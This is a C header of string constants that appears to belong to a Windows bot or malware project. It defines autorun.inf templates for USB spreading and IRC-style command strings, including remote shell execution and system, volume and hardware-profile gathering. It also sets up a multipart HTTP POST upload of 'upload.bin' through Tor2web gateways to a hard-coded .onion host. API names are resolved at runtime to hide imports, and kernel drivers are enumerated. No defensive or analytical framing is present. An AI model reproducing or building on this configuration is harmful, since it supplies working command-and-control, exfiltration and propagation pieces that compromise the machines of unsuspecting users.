/*
 * WARNING: Any changes in this file may require a *FULL* project rebuild,
 *          depending what binary you want to use (e.g. loader_base* always require
 *          a full rebuild).
 *          This file will be read and processed by hdr_crypt.
 *          It's capabilities are limited. Obey the format: #define NAME "VALUE"
 *          Using #define's spanning over multiple lines is _NOT_ allowed!
 *          Please do _NOT_ run any source code formatter on this file!
 *    e.g.: `git clean -df . ; cmake . ; make -j4`
 * REMEMBER: Multi-line macros are _NOT_ allowed!
 *    e.g.: `#define SMTH "foo" \
 *                        "bar"`
 */


#define LOWER_ALPHA          "0123456789abcdefghijklmnopqrstuvwxyz"
#define HEX_ALPHA            "0123456789ABCDEF"
#define FORMAT_FAKE_ARR      "%%\x0A%c\x0A%u\x0A%d\x0A%ld\x0A%ld\x0A%lld\x0A%llu\x0A%X\x0A%x\x0A%s\x0A%i\x0A%p\x0A%n\x0A%zul\x0A"
#define DLLSECTION           ".miller"
#define LDRSECTION           ".minit"
#define COUNTER_KERNEL32     "Kernel32.DLL"
#define COUNTER_UNKNOWNLIB   "MiProjA.DLL"
#define INFODLL              "Advapi32.dll"
#define SHELLDLL             "Shell32.dll"
#define DIRFILE_FMT          "%s\\%s"
#define FILE_AUTORUN_INF     "autorun.inf"
#define FILE_AUTORUN_EXE     "autorun.exe"
#define AUTORUN_OPEN         "open="
#define AUTORUN_FMT          "[AutoRun]\x0D\x0A  open=%s\\%s\x0D\x0A  action=Open\x0D\x0A"
#define DXGKRNL              "dxgkrnl.sys"
#define NWIFI                "nwifi.sys"
#define KSTHUNK              "ksthunk.sys"
#define VWIFIFLT             "vwififlt.sys"

/* SECTION: FUNCS */
#define FUNC_LOADLIBRARYA    "LoadLibraryA"
/* HEAP */
#define FUNC_HEAPCREATE      "HeapCreate"
#define FUNC_HEAPALLOC       "HeapAlloc"
#define FUNC_HEAPREALLOC     "HeapReAlloc"
#define FUNC_HEAPFREE        "HeapFree"
/* MEMORY */
#define FUNC_VIRTUALFREE     "VirtualFree"
#define FUNC_MOVEMEMORY      "RtlMoveMemory"
#define FUNC_FILLMEMORY      "RtlFillMemory"
#define FUNC_ISBADREADPTR    "IsBadReadPtr"
/* STD I/O */
#define FUNC_MULTIBYTETOWCHAR "MultiByteToWideChar"
/* FILE I/O Functions */
#define FUNC_CLOSEHANDLE     "CloseHandle"
#define FUNC_CREATEFILEA     "CreateFileA"
#define FUNC_GETFILESIZE     "GetFileSize"
#define FUNC_READFILE        "ReadFile"
#define FUNC_WRITEFILE       "WriteFile"
#define FUNC_SETFILEPOINTER  "SetFilePointer"
/* other */
#define FUNC_GETCURRENTPROCESSID    "GetCurrentProcessId"
#define FUNC_GETSYSTEMTIME          "GetSystemTime"
#define FUNC_GETMODULEFILENAMEA     "GetModuleFileNameA"
#define FUNC_GETLASTERROR           "GetLastError"
#define FUNC_SETLASTERROR           "SetLastError"
#define FUNC_OUTPUTDEBUGSTRING      "OutputDebugStringA"
#define FUNC_GETLOGICALDRIVES       "GetLogicalDriveStringsA"
#define FUNC_GETDRIVETYPE           "GetDriveTypeA"
#define FUNC_GETDISKFREESPACE       "GetDiskFreeSpaceA"
#define FUNC_GETTEMPPATH            "GetTempPathA"
/* Threads/IPC */
#define FUNC_CREATETHREAD    "CreateThread"
#define FUNC_RESUMETHREAD    "ResumeThread"
#define FUNC_GETTHREADCTX    "GetThreadContext"
#define FUNC_SETTHREADCTX    "SetThreadContext"
#define FUNC_GETCURRENTTHREAD "GetCurrentThread"
#define FUNC_WAITSINGLEOBJ   "WaitForSingleObject"
#define FUNC_SWITCHTOTHREAD  "SwitchToThread"
/* ENDSECTION */

#define SOCKDLL              "Ws2_32.dll"

/* SECTION: SOCK_FUNCS */
/* Socket/Network I/O */
#define SOCKFUNC_INIT        "WSAStartup"
#define SOCKFUNC_ERROR       "WSAGetLastError"
#define SOCKFUNC_SOCKET      "socket"
#define SOCKFUNC_SHUTDOWN    "shutdown"
#define SOCKFUNC_CLOSESOCKET "closesocket"
#define SOCKFUNC_GETADDRINFO "getaddrinfo"
#define SOCKFUNC_CONNECT     "connect"
#define SOCKFUNC_SEND        "send"
#define SOCKFUNC_RECV        "recv"
#define SOCKFUNC_SETSOCKOPT  "setsockopt"
/* ENDSECTION */

/* SECTION: SOCK_STRS */
/* Socket communication strings */
#define SOCKSTR_MOTD         "001 "
#define SOCKSTR_PING         "PING"
#define SOCKSTR_PRIVMSG      "PRIVMSG"
#define SOCKSTR_NOTICE       "NOTICE"
#define SOCKCMD_GETCMD       "gcl"
#define SOCKCMD_GETSYS       "gsi"
#define SOCKCMD_GETVOL       "gvi"
#define SOCKCMD_GETHWPROFILE "gchp"
#define SOCKCMD_SHELLEXEC    "se"
#define SOCKCMD_ENUMDEVICES  "devs"
#define SOCKCMD_FMT0         "%s"
#define SOCKCMD_FMT1         "%s: %d"
#define SOCKCMD_MSGERR       "ERROR"
#define SOCKCMD_MSGSHELL     "usage: [file] [params] [show]"
#define SOCKCMD_SHELLOP      "open"
/* ENDSECTION */

/* SECTION: HTTP */
/* WinHTTP */
#define HTTPDLL              "Winhttp.dll"
#define HTTPFUNC_OPEN        "WinHttpOpen"
#define HTTPFUNC_QUERYOPT    "WinHttpQueryOption"
#define HTTPFUNC_CLOSE       "WinHttpCloseHandle"
#define HTTPFUNC_CALLBACK    "WinHttpSetStatusCallback"
#define HTTPFUNC_CONNECT     "WinHttpConnect"
#define HTTPFUNC_REQUEST     "WinHttpOpenRequest"
#define HTTPFUNC_SEND        "WinHttpSendRequest"
#define HTTPFUNC_RESPONSE    "WinHttpReceiveResponse"
#define HTTPFUNC_QUERYDATA   "WinHttpQueryDataAvailable"
#define HTTPFUNC_QUERYHEADER "WinHttpQueryHeaders"
#define HTTPFUNC_READ        "WinHttpReadData"
#define HTTPFUNC_WRITE       "WinHttpWriteData"
#define HTTPFUNC_ADDHDR      "WinHttpAddRequestHeaders"
#define HTTP_UA              "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0"
#define HTTP_URI             "/%s_%s_%s_%s"
#define HTTP_URI_LIBTOR      "/%s_%s.dll"
#define HTTP_LIBTOR_DLL      "%slibonion.dll"
#define HTTP_LIBTOR_MAIN     "tor_main@8"
#define HTTP_METHOD          "POST"
#define HTTP_HEADERS         "Content-Type: multipart/form-data; boundary=----WebKitFormBoundarySTFU\x0D\x0AAccept: */*\x0D\x0AAccept-Encoding: identity"
#define HTTP_SUBHEADERS_BEG  "------WebKitFormBoundarySTFU\x0D\x0AContent-Disposition: form-data; name=\x22upload\x22; filename=\x22upload.bin\x22\x0D\x0AContent-Type: application/octet-stream\x0D\x0A\x0D\x0A"
#define HTTP_SUBHEADERS_END  "\x0D\x0A------WebKitFormBoundarySTFU--\x0D\x0A"
#define HTTP_ONION           "blackhat6r6ma6bd"
/* ENDSECTION */

/* SECTION: HTTP_LOCALHOST */
#ifdef _HTTP_LOCALHOST
#define HTTP_HOST_LOCAL      "localhost"
#endif
/* ENDSECTION */

/* SECTION: HTTP_WEB2TOR */
#ifndef _HTTP_LOCALHOST
#define HTTP_HOSTS           "%s.onion.link#%s.onion.to"
#endif
/* ENDSECTION */

/* SECTION: FUNCS_INFO */
/* information gathering */
#define INFO_GETVERSION      "GetVersion"
#define INFO_GETCMDLINE      "GetCommandLineA"
#define INFO_GETSYSTEMINFO   "GetSystemInfo"
#define INFO_GETVOLINFO      "GetVolumeInformationA"
#define INFO_GETSYSDIR       "GetSystemDirectoryA"
#define INFO_GETCURDIR       "GetCurrentDirectoryA"
#define INFO_GETFILEATTRS    "GetFileAttributesA"
/* ENDSECTION */

/* SECTION: FUNCS_OTHER */
/* non kernel32 functions */
#define INFO_GETCURHWPROFILE "GetCurrentHwProfileA"
#define SHELL_EXECUTE        "ShellExecuteA"
/* ENDSECTION */

/* SECTION: FUNCS_KERNEL */
/* kernel interaction */
#define KRNL_ENUMDEVICEDRIVERS "K32EnumDeviceDrivers"
#define KRNL_GETDEVICEDRIVERBN "K32GetDeviceDriverBaseNameA"
/* ENDSECTION */

/* ipc/console debugging */
#if defined(_PRE_RELEASE) || defined(_RUN_TESTS)
/* SECTION: DEBUG */
#ifdef _USE_PIPES
#define MILLER_MSGPIPE       "\\\\.\\pipe\\millermsg"
#endif
/* ENDSECTION */
/* SECTION: FUNCS_DEBUG */
#define FUNC_WAITNAMEDPIPE   "WaitNamedPipeA"
#define FUNC_ALLOCCONSOLE    "AllocConsole"
#define FUNC_ATTACHCONSOLE   "AttachConsole"
#define FUNC_FREECONSOLE     "FreeConsole"
#define FUNC_WRITECONSOLEA   "WriteConsoleA"
#define FUNC_GETSTDHANDLE    "GetStdHandle"
/* ENDSECTION */
#endif
